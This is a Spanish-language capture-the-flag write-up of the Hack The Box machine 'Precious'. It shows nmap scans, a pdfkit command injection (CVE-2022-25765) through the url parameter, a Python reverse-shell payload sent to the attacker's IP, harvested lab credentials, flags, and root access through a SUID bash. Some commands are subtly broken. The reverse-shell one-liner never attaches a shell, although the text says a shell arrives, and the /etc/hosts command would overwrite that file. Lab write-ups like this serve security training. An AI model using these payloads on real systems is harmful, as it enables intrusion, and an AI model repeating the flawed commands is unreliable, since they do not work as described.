---
title: Precious HTB
date: 2023-02-20
---
#linux #ruby #web 

## Reconocimiento

Comenzaremos comprobando que la máquina se encuentra activa con `ping`, y en base al ttl, podemos sospechar que se trata de una máquina **linux**. A continuación lanzamos [[nmap]] en busca de puertos abiertos:

```bash
sudo nmap -sS -p- --open --min-rate 5000 -n -Pn <ip>
```
```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Vemos únicamente dos puertos, con *ssh* y *http*, lo que nos hace pensar que se trata de una página web. Volvemos a lanzar nmap para tratar de detectar las versiones y más info. de los servicios de cada puerto:

```bash
sudo nmap -sCV -p22,80 -n -Pn 10.10.11.189
```
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Comprobamos que en efecto se trata de un sistema linux, con *Debian*. A continuación trataremos de ver si hay algo interesante en la dirección que se nos reporta (http://precious.htb/). Una vez añadido al `/etc/hosts` (`sudo echo <ip> precious.htb > /etc/hosts`), accedemos a la página que contiene únicamente un formulario en el que se nos pide una url para supuestamente convertirla a pdf. Tratamos de montarnos un servidor http con python3 y pasarle la url de nuestro servidor:

```bash
sudo python3 -m http.server 80
```

La páguina nos convertirá la página por defecto de nuestro servidor en pdf. Lo descargamos y vemos los metadatos con `exiftool`:

```bash
exiftool page.pdf
```
```bash
ExifTool Version Number         : 12.16
File Name                       : page.pdf
Directory                       : .
File Size                       : 17 KiB
File Modification Date/Time     : 2023:04:06 10:03:51+02:00
File Access Date/Time           : 2023:04:06 10:04:13+02:00
File Inode Change Date/Time     : 2023:04:06 10:04:08+02:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```

Vemos que la página está utilizando `pdfkit` en su versión `0.8.6`. Con una breve búsqueda por internet descubrimos que esta versión es vulnerable.

## Explotación

La vuln, el [CVE-2022-25765](https://www.cve.org/CVERecord?id=CVE-2022-25765) , nos permite incluir comandos de shell en la url en caso de que esté mal sanitizada, así que con el servidor python de antes y haciendo uso de burpsuite, podemos tratar de mandar una petición con una inyección en el parámetro `url`:

```url
http://NUESTRA-IP:PORT/?name=%20`ls`
```

Y en el server de python recibimos:

```python
10.10.11.189 - - [06/Apr/2023 15:53:04] "GET /?name=%20app%0Aconfig%0Aconfig.ru%0AGemfile%0AGemfile.lock%0Apdf%0Apublic HTTP/1.1" 200 -
```

Podemos tratar ahora de ponernos en escucha con netcat:

```bash
nc -lvnp 9090
```

Y mandamos una reverse shell con python:

```bash
http://NUESTRA-IP:PORT/?name=%20`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("NUESTRA-IP",PUERTO));'`
```

Y recibiremos una shell, a la que le aplicaremos un [[Tratamiento de la tty]]. Tras esto comenzaremos a investigar:

```bash
$ whoami
ruby
$ cd 
$ ls
total 28
drwxr-xr-x 4 ruby ruby 4096 Apr  6 03:52 .
drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
drwxr-xr-x 4 ruby ruby 4096 Apr  6 06:37 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
$ cd .bundle
$ ls
config
$ cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

En el directorio personal de `ruby`, `/home/ruby/`, encontraremos un directorio oculto, `.bundle`, que contiene un archivo `config`, con las credenciales del usuario `henry:Q3c1AqGHtoI0aXAYFH`.

Tras conectarnos por ssh como `henry`, podemos ver un archivo `user.txt` con la flag de usuario (`5264d5870a71a585f0f78412a3a2829e`). Enhorabuena! Ya tienes la flag de usuario!

## Escalada de privilegios

Comenzamos buscando binarios con permisos SUID:

```bash
-bash-5.1$ find / -perm /4000
find: ‘/root’: Permission denied
find: ‘/etc/ssl/private’: Permission denied
find: ‘/etc/audit’: Permission denied
find: ‘/proc/tty/driver’: Permission denied
find: ‘/proc/20914/task/20914/fd/6’: No such file or directory
find: ‘/proc/20914/task/20914/fdinfo/6’: No such file or directory
find: ‘/proc/20914/fd/5’: No such file or directory
find: ‘/proc/20914/fdinfo/5’: No such file or directory
find: ‘/var/spool/cron/crontabs’: Permission denied
find: ‘/var/spool/rsyslog’: Permission denied
find: ‘/var/log/private’: Permission denied
find: ‘/var/log/audit’: Permission denied
find: ‘/var/tmp/systemd-private-7367b6c71dcf42eab5f40c0b40af6953-systemd-logind.service-DAEDvf’: Permission denied
find: ‘/var/lib/private’: Permission denied
find: ‘/var/lib/nginx/body’: Permission denied
find: ‘/var/lib/nginx/uwsgi’: Permission denied
find: ‘/var/lib/nginx/scgi’: Permission denied
find: ‘/var/lib/nginx/fastcgi’: Permission denied
find: ‘/var/lib/nginx/proxy’: Permission denied
find: ‘/var/lib/apt/lists/partial’: Permission denied
find: ‘/var/cache/ldconfig’: Permission denied
find: ‘/var/cache/private’: Permission denied
find: ‘/var/cache/apparmor/c08a2770.0’: Permission denied
find: ‘/var/cache/apt/archives/partial’: Permission denied
find: ‘/lost+found’: Permission denied
find: ‘/tmp/passenger.wBtbK6q/apps.s’: Permission denied
find: ‘/tmp/runtime-ruby’: Permission denied
find: ‘/tmp/systemd-private-7367b6c71dcf42eab5f40c0b40af6953-systemd-logind.service-8CU6Wi’: Permission denied
find: ‘/tmp/vmware-root_496-826451958’: Permission denied
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/umount
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/bash
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/fusermount
find: ‘/usr/share/nginx/passenger_temp’: Permission denied
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
find: ‘/run/user/1000/systemd/inaccessible/dir’: Permission denied
find: ‘/run/sudo’: Permission denied
find: ‘/run/systemd/unit-root’: Permission denied
find: ‘/run/systemd/inaccessible/dir’: Permission denied
find: ‘/run/initramfs’: Permission denied
find: ‘/sys/kernel/tracing’: Permission denied
find: ‘/sys/kernel/debug’: Permission denied
find: ‘/sys/fs/pstore’: Permission denied
find: ‘/sys/fs/bpf’: Permission denied
```

Vemos que está habilitado el bit suid para el binario `/usr/bin/bash`, por lo que para lograr una sesión como `root` basta con ejecutar:

```bash
/usr/bin/bash -p
```

Ya solo queda acceder a la carpeta `/root` y ver el archivo `root.txt` (`fb65b73a1c034d96f66de5e1cebafcb6`). Enhorabuena! Has resuelto la máquina!